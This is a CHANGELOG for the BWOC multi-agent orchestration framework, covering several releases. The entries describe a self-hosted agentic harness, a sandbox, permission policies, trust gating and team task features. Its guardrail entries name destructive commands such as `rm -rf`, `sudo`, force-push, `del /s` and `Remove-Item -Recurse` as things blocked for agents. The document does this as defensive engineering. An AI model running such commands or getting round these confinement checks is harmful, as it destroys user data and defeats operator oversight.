- **`bwoc-harness` — per-model token-limit checker + auto-switch (issue #13)** — the agentic loop now tracks a per-model context limit (`LoopConfig.model_context_limits`); when the running context nears the *active* model's limit it switches to a configured larger-context model from `token_pressure_models` (if one passes the vetted-model gate) **before** falling back to compaction — escalate-only, no history loss. A distinct trigger from the error-based `fallback_models` chain; recorded separately in telemetry (`token_pressure_switches`). Backend-neutral, dep-lean. Per-model limits can also be **provider-queried** (#19) — Ollama `/api/show` `num_ctx`, cached per model — when not set in static config (precedence: static → queried → default).
- **Trust v2 — warn-mode refusal (`off` / `warn` / `refuse`) (issue #6 / WS5)** — the inter-agent trust gate gains an explicit per-recipient `mode` (manifest `trust.mode`): `warn` lets an envelope from a sender missing a required Kalyāṇamitta quality **pass** while emitting a `trust_warn` log line, instead of refusing it. Backward-compatible — a manifest without `mode` keeps v1 semantics exactly (empty `requiredTrust` → off, non-empty → refuse); `warn` is opt-in, no silent demotion. Realises `trust.md` §Refusal modes. (Cryptographic signed envelopes remain deferred — see above.)
- **`bwoc peer` — read-only cross-workspace view + learn (issue #20)** — `bwoc peer list` shows peers declared in `.bwoc/interconnect/routes.toml`; `bwoc peer status <key>` reads (read-only, local FS) a peer's agents (`AgentsRegistry`) + Saṅgha open tasks; `bwoc peer learn <key>` reads a peer's **allowlisted** shared docs (the peer opts in via `.bwoc/interconnect/shared.toml`; path-containment enforced) (#26). Reuses existing loaders pointed at the peer root — no new parsing/deps. *Give-feedback* (write, needs cross-workspace identity) stays deferred. Realises Oracle's cross-mesh state-sensing — **Kalyāṇamitta / Samānattatā / Anattā** (no central broker).
- **`bwoc sessions` — discover + monitor agent sessions (issue #21)** — `bwoc spawn` drops a `.bwoc/sessions/<agentId>.json` marker (backend / pid / startedAt / tmux); `bwoc sessions` reads markers (pid-liveness via `libc::kill`, stale markers cleaned) plus a process/tmux **scan fallback** (behind a mockable seam) for unmarked backend processes, reporting backend / agent / pid / state / source. Observe-only (never drives a session); backend→process map in one place (Samānattatā); dep-lean.
- **`bwoc-harness` — OpenAI-compatible provider + vetted-model mode (issue #6 / WS4)** — `Backend::OpenAiCompatible` runs any OpenAI-compatible endpoint (vLLM / LM Studio / llama.cpp / remote) via a `baseUrl` manifest field passed to the harness `--endpoint` (`OPENAI.md → AGENTS.md` symlink); the provider client is unchanged. `--vetted-mode off | warn | enforce` (default `warn`, backward-compatible) controls an unvetted model — `enforce` refuses an unvetted primary model before turn 1. dep-lean (no new crate).
- **`bwoc-harness` — real OS-level sandbox (issue #6 / WS2)** — replaces the OsSandbox stub: **landlock** (Linux ≥ 5.13 — a `pre_exec` ruleset restricting filesystem writes to the worktree) + **sandbox-exec** (macOS SBPL profile, canonical-path-confined). A factory selects by OS; **graceful-degrade** to the worktree-allowlist on unsupported kernels (never hard-fails). Defence-in-depth over the existing `confine_path`. The `landlock` crate is a Linux-target dep in `bwoc-harness` only.
- **`bwoc-harness` — Windows support (issue #6 / WS7)** — a cross-platform `shell_command` (`sh -c` on Unix, `cmd /C` on Windows) replaces the `sh`-only shell-outs, and the harness is **re-enabled in Windows CI** (workspace now tested uniformly on ubuntu / macos / windows). Caveat: the dangerous-path guardrails are still unix-oriented — Windows-specific destructive patterns (`del /s`, `rmdir /s`, `Remove-Item -Recurse`) are tracked as **#31**.

### Fixed

- **`bwoc new` left `AGENTS.md` placeholders unsubstituted (issue #4)** — the scaffolder now substitutes every `config.manifest.json` placeholder into the generated `AGENTS.md` (and adds `--primary-capability`), so a freshly-created agent is backend-neutral-clean with no leftover `{{…}}` tokens.

## [v2026.5.24-0] — 2026-05-24 — 2.2.0

**Minor release.** Phase 3 (*vaya + interconnect*) — inter-workspace routing, worktree lifecycle, and `bwoc retire` full vaya — plus the new **`bwoc-harness`** self-hosted agentic runtime (run Ollama / any OpenAI-compatible model as a full BWOC agent; Unix-first in v1), and the Windows-CI TOML fix + `actions/checkout` v6 bump. Cargo SemVer `2.1.0` → `2.2.0`. CalVer per [VERSION.md policy](VERSION.md#versioning-policy--dual-namespaces).

### Added

- **Inter-workspace routing — Phase 3 Track A** — `.bwoc/interconnect/routes.toml` lets `bwoc send` reach an agent in a *peer* workspace with no central broker. `bwoc-core::routing` adds a `Routes` type (peer-declared `agent` xor `namespace` → workspace root) and a resolve order: exact `agent` → longest `namespace` prefix → `NotFound`. `send` consults it only after a local-registry miss, so the local-delivery path is byte-for-byte unchanged. Composes with the Kalyāṇamitta-7 trust gate — a cross-workspace sender resolves as `unknown_sender` and is refused — so routing ships ahead of Trust v2. Spec: [`modules/agent-template/interconnect/routing.md`](modules/agent-template/interconnect/routing.md) (+ `.th.md`); mapped to **Anattā** (SN 22.59): no central self, no central broker. Delivers the "coordinate without a central authority" half of the Phase 3 DoD.
- **Worktree lifecycle — Phase 3 Track B** — a `git_worktree` shell-out util (no `git2`/`gitoxide`) plus a `task-claimed` Saṅgha hook that fires `git worktree add <worktreeBase>/<agentId>/<taskId> -b agent/<agentId>/feat/<taskId>` when an agent claims a task. The Saṅgha `Task` struct is **not** extended — worktree location follows the `<worktreeBase>/<agentId>/<taskId>` path convention so retire cleanup is deterministic without parsing any agent log.
- **`bwoc retire` full vaya — Phase 3** — retire now ends an agent's life cleanly: worktree cleanup (worktrees under `<worktreeBase>/<agentId>/` removed via the git util), branch release (`agent/<agentId>/*` — `-d`, escalating to `-D` with the forced branch names surfaced in human + `--json` output), and interconnect deregister (`Routes::remove_agent_routes` strips routes whose `agent` targets the retiree from `routes.toml`). Idempotent and respects the existing file-mode flags. Completes the "an agent's life ends cleanly" half — **the Phase 3 DoD is now met.**

**`bwoc-harness` — self-hosted agentic runtime (issue #1, P1–P5)**

- **New crate `crates/bwoc-harness`** — OpenAI-compatible model-API client + agentic loop runtime for self-hosted / local LLM backends (Ollama first; any `/v1/chat/completions` endpoint). Heavy deps (tokio, reqwest, keyring) are quarantined inside this crate; `bwoc-cli`/`bwoc-agent`/`bwoc-core` stay dep-lean — the zero-dep orchestrator guarantee holds for the default path. Spec: [`docs/en/HARNESS.en.md`](docs/en/HARNESS.en.md) (+ `.th`).
- **Safety guardrails (P2)** — hard, non-overridable engine mapping Sīla 5 + Taṇhā 3: blocks `rm -rf` repo/worktree root, secret writes (PEM/PAT/AWS/credential patterns), identity spoofing, `--no-verify`/force-push, `sudo`/`su`. Denials are fed to the model as tool results — the loop never panics on a denial.
- **Permission system (P2)** — per-tool / per-pattern `allow | ask | deny` from `.bwoc/harness-policy.toml`; `ask` on non-TTY/autonomous fails-safe to `deny`; no policy file = deny-all.
- **Sandbox (P2)** — worktree-confined fs writes (symlink-escape detection), `run_command` cwd-locked + env-scrub + arg-level scan. OS-level isolation (`sandbox-exec`/landlock) is a **pluggable stub** in v1 — worktree+allowlist only.
- **Tool-auth broker (P3)** — scoped credentials from the OS keyring injected into the child env at exec only; never in prompt, log, or telemetry.
- **Task queue (P3)** — async bounded cancellable queue integrating `bwoc-core::team` (Saṅgha); one task in-flight per worktree; `unclaim` rollback on rejection.
- **Telemetry (P3)** — per-turn metrics → `session-metrics.jsonl` (additive to AGENTS.md §8b); OpenTelemetry behind `--features otel` (stub by default).
- **Eval framework (P4)** — offline fixture runner (`task.toml` + `seed/` + `expected/`, rubric scoring); CI tests use a mock provider (no live model). Feeds Paññā 3 triggers.
- **Loop hardening (P4)** — exponential-backoff retry, fallback-model chain, warn-only vetted-model gate, context compaction (truncate-with-marker).
- **Full tool set** — read/write/edit_file, list_dir, grep, run_command, git, run_gates, bwoc_task, bwoc_send, memory_read/write — every tool routed through the guardrails → permission → sandbox pipeline.
- **Backend wiring (P5)** — `bwoc spawn --backend ollama` execs the `bwoc-harness` binary; `OLLAMA.md → AGENTS.md` template symlink.
- **Live-validated 2026-05-23** — end-to-end against real Ollama (`gemma4:latest`): the loop created and ran a correct file; with no policy it correctly denied the write (fail-safe) and fed the denial back to the model. **v1 caveat:** OS-level sandbox is a stub; treat unvetted models + permissive policies with care.

### Fixed

- **Windows CI — routing tests** — the routing peer tests built `routes.toml` by interpolating a temp path into a double-quoted TOML basic string; on Windows the backslashes (`C:\…`) parsed as invalid escapes and failed 3 tests. Switched to single-quoted TOML *literal* strings, which preserve paths verbatim on every platform.

### Changed

- **CI — `actions/checkout` v4 → v6** — checkout v6 runs on Node 24 natively; the `FORCE_JAVASCRIPT_ACTIONS_TO_NODE24` env still covers the remaining JS actions. Removes the Node 20 deprecation banner ahead of the runner cutover.

## [v2026.5.23-3] — 2026-05-23 — 2.1.0

**Minor release.** Saṅgha v1 (agent teams + shared task list, daemon task-watch, opt-in auto-claim, plan-approval Pavāraṇā, blocking task hooks), the single trunk-based branching standard, the "What's New" CLI surface, and dashboard single-agent lifecycle hotkeys. Cargo SemVer `2.0.94` → `2.1.0`. CalVer per [VERSION.md policy](VERSION.md#versioning-policy--dual-namespaces).

### Added

- **Saṅgha Phase B — daemon task-watch** — `bwoc-agent --serve` now watches the shared task lists of every team its agent belongs to and announces newly-claimable tasks (`pending` + deps complete) to stderr: `bwoc-agent: task available ← <team>/<task>: <title>`. Snapshots open tasks at startup (no replay), polls on a 2s cadence, inert when the agent is on no team. **Opt-in wakeup** (`BWOC_TASK_WAKEUP=1`) additionally pings the agent's tmux session with a `[bwoc task <team>/<id>] <title>` marker so a live Claude session can `bwoc task claim` — the agent stays in control (no auto-claim, no stranding). Auto-claim and task hooks deferred to Phase B+. New `bwoc-agent::task_watch` (4 tests). See `modules/agent-template/interconnect/sangha.md` §Phase B.
- **Saṅgha plan approval — Pavāraṇā (Phase C)** — a task can require lead sign-off on a plan before completion. `bwoc task add … --requires-plan` gates the task; `bwoc task plan <team> <task> --as <agent> --plan …` (or `--plan-file`) submits/revises (claimant only) and `bwoc task plan <team> <task>` shows it; `bwoc task approve` / `bwoc task reject` are the lead's verdict (no `--as` — the human is the lead). `bwoc task complete` is refused until the plan is approved — the gate lives in `bwoc-core::team::complete_task` so it holds across every surface. Non-plan tasks are unaffected (opt-in per task). 5 core tests; live-verified the full submit → reject → resubmit → approve → complete cycle. Saṅgha is now feature-complete (A → B/B+ → hooks → C).
- **Saṅgha auto-claim (opt-in)** — `BWOC_AUTO_CLAIM=1` closes the autonomous-teamwork loop: when `bwoc-agent --serve`'s task-watch sees a new claimable task it claims it for its agent (via the locked `bwoc task claim` CLI path — lost races just log) and wakes the agent to work it. Riskiest mode (daemon mutates shared state), gated separately from `BWOC_TASK_WAKEUP`, off by default. Live-verified: daemon auto-claimed a task added while running. Full loop: add → daemon sees → claims → wakes.
- **Saṅgha task hooks** — optional workspace-level shell hooks `<ws>/.bwoc/hooks/task-created` + `task-completed` fire on `bwoc task add` / `complete` (mirrors Claude Agent Teams' TaskCreated/TaskCompleted). Context arrives as env vars (`BWOC_TEAM`, `BWOC_TASK_ID`, `BWOC_TASK_TITLE`, `BWOC_AGENT`); a non-zero exit **blocks** the operation (task file unchanged, hook stderr surfaced, exit 2). Missing/non-executable hook = silent no-op. Use for quality gates (e.g. a `task-completed` hook that runs tests). 1 unit test; live-verified pass + block on both events.
- **Online docs link in the CLI** — the bare-`bwoc` banner and `bwoc help` index now surface <https://bemindlabs.github.io/BWOC-Framework/>.

**"What's New" surface**

- **Banner** (bare `bwoc`) gains a `✨ What's New` section listing the current release's highlights.
- **Once-per-version upgrade notice** — any subcommand prints a one-line "you upgraded" notice to stderr the first time it runs on a new `MAJOR.MINOR` (keyed on `~/.bwoc/last-seen-version`, so patch churn doesn't spam). Silent on non-TTY / piped / `--json` output; suppress with `BWOC_NO_WHATSNEW=1`. Highlights live in `crates/bwoc-cli/src/whats_new.rs` (single source; the banner imports them).

**Saṅgha v1 Phase A — teams + shared task list**

- **`bwoc-core::team`** — `Team` (TOML membership) + `Task`/`TaskState` (JSONL) with pure transition rules: `add_task` (dup + unknown-dep rejection), `claim_task` (pending + all-deps-completed → in_progress + claimant), `complete_task` (in_progress + claimant-only → completed). 11 unit tests.
- **`bwoc team create/list/retire`** + **`bwoc task add/list/claim/complete`** — a team groups a subset of workspace agents under one shared task list; teammates self-claim with `--as <agent>` (member-guarded). Dependency-free `O_EXCL` advisory lock (PID + signal-0 staleness steal) serializes claims so two agents never claim the same task; atomic tmp+rename writes; `--json` on every command. Human operator is the implicit lead (no `lead` field).
- **`interconnect/sangha.md` + `.th.md`** — bilingual spec mapping **Saṅgaha-vatthu 4** (team-cohesion norms) + **Saṅghakamma** (the lock-settled claim) to the model. Daemon task-watch, plan approval (Pavāraṇā), and a dashboard task pane are deferred to Phase B/C. See [`notes/2026-05-23_sangha-v1-phase-a.md`](notes/2026-05-23_sangha-v1-phase-a.md).

**Dashboard single-agent lifecycle hotkeys**

- **`s` (start)** — runs the selected agent from the TUI: flips registry status to active and spawns `bwoc-agent --serve`. Shells out to `bwoc start <id> --yes --json` with captured output (TUI-safe), parses `daemon_pid` / `already_running` into the footer, refreshes so status + ●/○ flip. See [`notes/2026-05-23_dashboard-start-hotkey.md`](notes/2026-05-23_dashboard-start-hotkey.md).
- **`x` (stop)** — stops the selected agent (signal the daemon + flip status stopped). Parses `bwoc stop --json`'s `daemon_outcome` enum into a precise footer message. The dashboard now covers the full single-agent lifecycle: chat (`t`/`g`), log (`l`), inbox (`i`), start (`s`), stop (`x`), refresh (`r`). See [`notes/2026-05-23_dashboard-stop-and-start-race-fix.md`](notes/2026-05-23_dashboard-stop-and-start-race-fix.md).

### Changed

- **Single trunk-based branching standard** — consolidated three divergent branch-naming conventions (template `AGENTS.md` §4, `conventions.md`, root `CONTRIBUTING.md`, and SRS FR-4.7 in EN+TH) into one trunk-based / GitHub Flow standard: `main` is the only long-lived branch; topic branches are `<type>/<slug>` where `type` ∈ the Conventional Commit vocabulary (`feat fix docs refactor test chore perf style ci`); the multi-agent collision guard prefixes `agent/<agent-id>/`; no `release/*` or `hotfix/*` branches (CalVer tags cut directly on `main`); branches are deleted after merge (Anattā). See [`notes/2026-05-23_branching-standard-and-team-personas.md`](notes/2026-05-23_branching-standard-and-team-personas.md).

### Fixed

- **`bwoc start` duplicate-daemon race** — `spawn_daemon` now writes `.bwoc/agent.pid` from the parent (with the child's pid) immediately after spawn instead of waiting for the daemon's own startup write. A second `bwoc start` arriving in that window previously read no pid file and spawned a duplicate daemon; it now correctly reports `already_running`.

### Security

- **Dependabot `time` DoS (GHSA-r6v5-fh4h-64xc)** dismissed as not-affected — `time` reaches BWOC only transitively via ratatui-widgets (TUI formatting); the DoS is in time's parsing of untrusted strings, which BWOC never does. Fix (0.3.47) requires Rust 1.88 vs the MSRV 1.85. See [`notes/2026-05-23_time-cve-triage.md`](notes/2026-05-23_time-cve-triage.md).

## [v2026.5.23-2] — 2026-05-23 — BWOC 2.0

**First major version of the BWOC framework.** Significant capability stack on top of the v2026.5.23 baseline; one BREAKING backend rename (`gemini` → `antigravity`/`agy`). Cargo SemVer jumps `0.1.721` → `2.0.0` to mark the discontinuity. CalVer per [VERSION.md policy](VERSION.md#versioning-policy--dual-namespaces).

### Highlights

- **Kalyāṇamitta-7 trust system** — spec v1.1 + 4 implementation steps; permissive by default, opt-in gating via `BWOC_TRUST_GATING=1`.
- **Agent → agent messaging** (Sammā-vācā Phase 1) — `--from` flag + Sāraṇīyadhamma 6 norms in `interconnect/messaging.md`.
- **Inbox tmux wakeup + Stop-hook auto-reply** — sub-second turn latency; `messageId` always, `replyTo` optional.
- **Phase 4 fleet governance spec** (Aparihāniya-dhamma 7, DN 16) — operator-facing.
- **Dual-mode `bwoc check`** — distinguishes template from incarnation; closes silent-pass bug for un-personalized agents.
- **`bwoc chat --ghostty`** + dashboard `g` hotkey for the new-window launcher.
- **HITL cleanup pass** — `bwoc status --banner`, dashboard refusal badge, `start`/`stop` non-TTY consistency, Stop-hook failure surfacing.
- **Auto-version hook** gains minor/major sentinel support via `scripts/queue-bump.sh`.

### Added

**Inbox tmux wakeup + Stop-hook auto-reply (ported from `it-app-workspace/bin`)**

- **Envelope schema** — `inbox.jsonl` envelopes now carry `messageId` (always, format `msg-YYYYMMDDTHHMMSSZ-<5hex>`) and optional `replyTo`. Both fields are additive — `serde_json::Value` readers in the daemon and `bwoc inbox` ignore them silently, so no behavior change for existing flows. Mattaññutā — required-field set unchanged.
- **`bwoc send` flags** — new `--reply-to <msg-id>` threads a reply; new `--no-wakeup` skips the tmux ping for CI/daemon callers. Env opt-out `BWOC_DISABLE_TMUX_WAKEUP=1` for process-wide suppression (used by tests).
- **Native tmux wakeup** — after a successful inbox append, `bwoc send` attempts `tmux send-keys -t <bare-name>` of the marker `[bwoc inbox <msg-id> from <sender>] <message>`. Two-step submit (text → 200 ms → Enter) for the Claude TUI input quirk. Silent skip when tmux is absent or no session matches — daemon poll remains the source-of-truth delivery path.
- **Stop-hook auto-reply** — `modules/agent-template/.claude/hooks/inbox-auto-reply.sh` (new) is a Claude Code Stop hook: reads transcript, detects the inbox marker in the last user prompt, posts the last assistant text back to the original sender with `--reply-to`. Wired via `modules/agent-template/.claude/settings.json` (also new). Backend neutrality: hook is Claude-specific by event-surface; analog paths for AGY / CODEX / KIMI deferred — protocol is shared.
- **Docs** — `modules/agent-template/interconnect/messaging.md` + `.th.md` gain §Envelope Schema field table, `--reply-to` / `--no-wakeup` CLI rows, and a new §Wakeup & Auto-Reply explaining the two-half design (native tmux + Stop hook) plus the per-backend deferral matrix.

See [`notes/2026-05-23_inbox-wakeup-and-auto-reply.md`](notes/2026-05-23_inbox-wakeup-and-auto-reply.md).

### Changed — BREAKING

**Backend rename: `gemini` → `antigravity` (CLI `agy`)**

- Google's Gemini CLI stops serving Google One / unpaid tiers on 2026-06-18 and the replacement coding CLI is **Antigravity** (`agy`), a multi-vendor router exposing Gemini, Claude, and GPT-OSS model families through one binary. Per [Samānattatā](modules/agent-template/docs/en/PHILOSOPHY.en.md), the framework follows the actual product surface — backend `gemini` is replaced by backend `antigravity` everywhere.
- **Rust** (`crates/bwoc-cli`): `Backend::Gemini` → `Backend::Antigravity`, `cli_name()` returns `"agy"`, model list now covers `gemini-3.5-flash-*`, `gemini-3.1-pro-*`, `claude-{sonnet,opus}-4.6-thinking`, `gpt-oss-120b-medium`. All backend-symlink arrays (`check.rs`, `doctor.rs`, `status.rs`, `new.rs`, `dashboard.rs`) swap `GEMINI.md` → `AGY.md`. `bwoc check` `BACKEND_PHRASES` now flags `Antigravity will/can` (not `Gemini will/can`); `HARDCODED_MODELS` gains `gemini-3`, `gpt-oss`. 115 tests pass.
- **Symlinks**: `GEMINI.md` deleted in `modules/agent-template/`, `agents/agent-pi/`, `agents/agent-oracle/`. `AGY.md → AGENTS.md` created in their place.
- **Shell scripts**: `incarnate.sh` and `check-agent-neutrality.sh` updated to create / validate `AGY.md`; `HARDCODED_MODELS` and `BACKEND_PHRASES` mirror the Rust audit.
- **Docs (EN + TH parity)**: VISION, README, SECURITY, ARCHITECTURE, INCARNATION, WORKSPACE at root; AGENTS.md, README.md, CLAUDE.md, conventions.md, neutrality.md, persona/README.md, OVERVIEW, SRS, plugins/README in `modules/`. All `GEMINI.md` → `AGY.md`, "Gemini CLI" → "Antigravity CLI", `backend = "gemini"` → `backend = "agy"`. Model identifiers in `gemini-*` form stay (still the model family; only the routing CLI changed).
- **Migration**: existing agents with `GEMINI.md` symlinks remain functional only until `bwoc check` runs — the audit now expects `AGY.md`. Rename with `mv GEMINI.md AGY.md` or run `bwoc new --force` to regenerate. Existing `.bwoc/agents.toml` entries reading `backend = "gemini"` will fail to parse (no `Backend::Gemini` variant); edit to `backend = "agy"`.

See [`notes/2026-05-23_antigravity-rename.md`](notes/2026-05-23_antigravity-rename.md).

**Kalyāṇamitta-7 trust — all 5 implementation steps shipped**

- **Trust spec v1.1** (`docs(spec)` `f815dbe`) — `modules/agent-template/interconnect/trust.md` + `.th.md` revised to incorporate Oracle + Pi review feedback on the v1 draft shipped 2026-05-23.
- **Step 1 — core** (`feat(core)` `1c54cbc`) — `bwoc-core::Manifest` gains `TrustBlock` + `TrustDeclared`. Manifests now deserialize a `trust` section (7 booleans + optional `requiredTrust` array) with permissive defaults; existing manifests load unchanged.
- **Step 2 — check** (`feat(check)` `ce3907f`) — `bwoc check` verifies Kalyāṇamitta-7 evidence: each declared trust boolean is cross-checked against the matching repo signal so the manifest cannot lie about itself.
- **Step 3 — trust read** (`feat(cli)` `cd10a52`) — new `bwoc trust <agent> read` reports the declared trust block for an agent in the workspace; foundation for the step-4 inbox refusal gate.
- **Step 4 — daemon refusal** (`feat(agent)` pending) — `bwoc-agent --serve` refuses inbox envelopes from senders missing required trust qualities, behind `BWOC_TRUST_GATING=1` env opt-in (v1 safety). Refusals are written to a sidecar `.bwoc/inbox.refusals.jsonl` (never modifying the original envelope — append-only auditability); `bwoc inbox` joins the sidecar at read time so `jq '.[] | select(.refused)'` works verbatim. `from=user` always passes per spec. New `bwoc-core::time` module promoted from `bwoc-cli::util` to share UTC ISO 8601 between CLI + agent. 19 new tests. See [`notes/2026-05-23_trust-step-4.md`](notes/2026-05-23_trust-step-4.md).
- **Step 5 — this CHANGELOG roll-up.** Trust feature complete behind opt-in; v2 (warn-mode, identity proof) is a separate ROADMAP item.

**`bwoc check` becomes dual-mode (template vs incarnation)**

- **Mode detection** (`feat(check)` pending) — `bwoc check` now reads `config.manifest.json::name` to decide whether the target is the template (placeholder name like `{{name}}`) or an incarnated agent (real name). Template mode keeps the existing behavior (asserts placeholders + neutrality rules hold). Incarnation mode asserts the opposite: NO `{{xxx}}` placeholders survive (except `{{taskId}}`, whitelisted as runtime per Appendix A) AND skips the hardcoded-model / hardcoded-tool / backend-phrasing neutrality checks (those guard the scaffold, not the per-agent commitment). Fixed the latent bug where an incarnated-but-not-personalized agent silently passed `bwoc check`. 9 new tests. See [`notes/2026-05-23_check-dual-mode-and-personalize.md`](notes/2026-05-23_check-dual-mode-and-personalize.md).

**Agent personalization**

- **`agents/agent-pi/` + `agents/agent-oracle/` personalized** — placeholders in AGENTS.md + persona/README.md substituted from manifest values (mechanical) + persona-level fields filled with concrete content (`primaryCapability` / `scopeDescription` / `outOfScope` / `moduleName`). Pi = Rust implementation across `bwoc-*` crates; Oracle = fleet coordination via inbox/messaging. Template-only Appendix A (Placeholder Reference) + Appendix B (Quick-Start Checklist) removed from the incarnated agents — those docs apply pre-incarnation only. Both agents now pass `bwoc check` with 0 violations.

**Agent → agent messaging — Sammā-vācā Phase 1**

- **`bwoc send --from <agent>` flag** (`feat(cli)` pending) — `bwoc send` gains an optional `--from <agent>` flag so an envelope can carry a real sender identity (not just `from: "user"`). The named sender must exist in the workspace registry; unknown sender → exit 2 with `SenderNotFound`. Trust verification stays at the recipient daemon (already implemented in trust step 4) so this iter is purely sender-identity plumbing. Backward compatible: omitting `--from` writes `from: "user"` exactly as before.
- **`interconnect/messaging.md` + `.th.md`** — new spec covering the envelope schema, `--from` resolution rules, and **Sāraṇīyadhamma 6** (AN 6.11–12) mapped to engineering rules (API stability, kindly speech, charitable interpretation, observability, common Sīla baseline, shared philosophy graph). Norms only — `bwoc check` does not gate them; the spec exists so an incarnated agent can internalize them.
- **Live verified** — scenario A: sender lacks required qualities → daemon refuses + sidecar log + `jq 'select(.refused)'` matches; scenario B: sender declares qualities → passes silently, no sidecar. See [`notes/2026-05-23_agent-to-agent-messaging.md`](notes/2026-05-23_agent-to-agent-messaging.md).

**Phase 4 — Fleet governance spec (Aparihāniya-dhamma 7)**

- **`docs/en/FLEET-GOVERNANCE.en.md` + `.th.md`** — new framework-root operator-facing spec. Seven non-decline conditions from DN 16 (Mahāparinibbāna Sutta, §1.4 — the Vajjī teaching) mapped to workspace-level fleet operations: (1) regular meetings → `bwoc list` cadence; (2) coordinated start/end → `bwoc doctor` + `bwoc workspace prune`; (3) process-bound convention change → `schemaVersion` discipline; (4) honor template version → `bwoc check --all` version-lag flag; (5) protect vulnerable → respect recipient refusals, don't relax `requiredTrust`; (6) honor shared resources → `agents.toml` + `workspace.toml` + template are operator-owned; (7) protect senior agents → audit trust-dependency before `bwoc retire`. Each condition lists an observable signal (existing query) and a suggested operator practice. v1 is descriptive (signals, not gates); v2 may promote signals to gates as telemetry justifies. **Phase 4 is structurally an ecosystem-viability phase** (external-adoption goals); this spec closes the one Phase-4 line item the framework itself owns. PHILOSOPHY.en.md / `.th.md` cross-reference updated to point to the new location. ROADMAP §Phase 4 gains a "Shipped" subsection. See [`notes/2026-05-23_phase-4-fleet-governance.md`](notes/2026-05-23_phase-4-fleet-governance.md).

**`bwoc chat --ghostty` + dashboard `g` hotkey**

- **`bwoc chat --ghostty <name>`** (`feat(cli)` `5110dde`) — new flag opens a fresh Ghostty terminal window running `bwoc spawn` for the agent. macOS-only (`open -na Ghostty.app --args -e bwoc spawn ...`); non-macOS exits 2 with a hint pointing at the manual `ghostty -e` invocation. Clap-mutex with existing `--tmux`.
- **Dashboard `g` hotkey** — mirrors `t` (tmux chat) but targets Ghostty. Help overlay row added. See [`notes/2026-05-23_chat-ghostty-launcher.md`](notes/2026-05-23_chat-ghostty-launcher.md).

**Cargo SemVer 2.0.0 + auto-version sentinel for minor/major**

- **Workspace version** (`build(version)` `b6885f8`) — `Cargo.toml` workspace.package version `0.1.721` → `2.0.0`. Aligns the Cargo SemVer with the BWOC 2.0 release identity. Per VERSION.md policy: Cargo SemVer captures dev checkpoints (auto-bumped on every edit), CalVer captures release identity.
- **Auto-version hook gains minor/major support** — `.claude/hooks/auto-version.sh` now reads `.bwoc/next-bump.<domain>` sentinel files (one-shot, deleted after consume). Defaults to patch when sentinel is absent. New `scripts/queue-bump.sh <software\|document> <minor\|major\|patch>` helper. See [`notes/2026-05-23_version-2-0-0-and-auto-bump-levels.md`](notes/2026-05-23_version-2-0-0-and-auto-bump-levels.md).

**HITL cleanup pass (4 small fixes from /investigate audit)**

- **`bwoc status --banner`** (`refactor(hitl)` `2e6a754`) — new flag on `bwoc status <agent>` replays the daemon's startup "I am alive" multi-line block from the manifest. No daemon required. Mutex with `--all`. Honors `--lang`. `--banner --json` emits `{"banner": "..."}`. 6 new FTL keys EN+TH; 3 new tests.
- **Dashboard refusal badge** — detail pane now renders `Refused: N` + sub-line `last refused: <reason> from <from>` in yellow when N > 0; omitted when N == 0. New `livecheck::refusal_summary()` helper reads `.bwoc/inbox.refusals.jsonl`.
- **`start`/`stop` non-TTY consistency** — single-agent paths previously failed silently when non-interactive without `--yes`. Now abort with exit 2 + actionable message matching `retire`'s pattern.
- **Stop-hook failure surfacing** — `inbox-auto-reply.sh` now captures stdout/stderr from `bwoc send --reply-to` and appends a diagnostic line to `<self>/.bwoc/agent.log` on non-zero exit. Happy path stays silent.
- See [`notes/2026-05-23_hitl-cleanup-pass.md`](notes/2026-05-23_hitl-cleanup-pass.md).

### Migration from v2026.5.23-1

Existing agents with `gemini` backend need two edits:

```bash
# 1. Rename the symlink in each agent dir (and template if you forked it)
cd agents/<your-agent> && mv GEMINI.md AGY.md
# 2. Edit .bwoc/agents.toml entries:
#    backend = "gemini"   →   backend = "agy"
```

Or regenerate with `bwoc new <name> --force` after the upgrade. Manifests without a `trust` block load unchanged (all fields optional with permissive defaults). Inbox envelopes without `messageId` are still readable (the field is additive — old envelopes pass through unmodified).

## [v2026.5.23-1] — 2026-05-23

### Fixed

- **Release workflow race condition** — five parallel matrix jobs each called `softprops/action-gh-release@v2` with create-or-update semantics; one created the release first, then the next-arriving job raced and failed with "Validation Failed: already_exists". Refactored into one `create-release` job (`gh release create --generate-notes`) + per-target matrix jobs that only `gh release upload --clobber`. `v2026.5.23-1` shipped all 10 assets (5 binaries + 5 sha256) on the first run, no rerun needed.

## [v2026.5.23-0] — 2026-05-23

First public release of the BWOC framework. CalVer scheme: `v<YYYY>.<M>.<D>-<patch>`.

### Added

Everything documented under the prior `[Unreleased]` "Phase 1 v2.0 work in progress" rollup is included in this release. Highlights:

**Open-source project hygiene**

- `VISION.md` + `VISION.th.md` — project purpose, the arc BWOC models, success criteria, non-goals, tradeoff principles. Bilingual (EN canonical, TH translation).
- `SECURITY.md` — coordinated disclosure process; scope; links to the existing threat model.
- `CODE_OF_CONDUCT.md` — BWOC-native (Sīla 5 prohibitions + Brahmavihāra 4 dispositions); explicitly non-sectarian.
- `VERSION.md` — current version mirror, source-of-truth pointer to `Cargo.toml`, SemVer policy, phase-vs-version distinction.
- Root `README.md` Tech Stack section, badges (License · Rust · platforms · languages · status), table of contents, and footer (Contributing · Security · CoC · License).

**Specification**

- `PHILOSOPHY.en.md` + `PHILOSOPHY.th.md` §0.1 *"The Arc"* — establishes **uppāda · ṭhiti · vaya** (AN 3.47 Saṅkhata Sutta) as the architectural shape underlying all 22 frameworks.

**Implementation — Phase 1 v2.0 (Rust)**

- Cargo workspace at the repo root: edition 2024, resolver 3, MSRV 1.85.
- `crates/bwoc-core` — shared types; declares `LifecyclePhase { Uppada, Thiti, Vaya }`.
- `crates/bwoc-cli` — `bwoc` binary with `--lang` flag (precedence: `--lang` flag > `BWOC_LANG` env > `$LANG` env > `en` fallback) and clap subcommand surface.
- `crates/bwoc-cli` — **`bwoc check [path]`** implemented. Full feature parity with `modules/agent-template/scripts/check-agent-neutrality.sh`: AGENTS.md existence, backend symlink validation (AGY/CODEX/KIMI → AGENTS.md), CLAUDE.md handling (symlink or standalone), `config.manifest.json` JSON validation, required placeholders, no YAML frontmatter, no wikilinks, no hardcoded model IDs/tool names, no backend-specific phrasing. Read-only; exit 0 = pass, 1 = violations. Pure-data `audit()` + `print_report()` for testability; two unit tests cover wikilink detection and missing-target case.
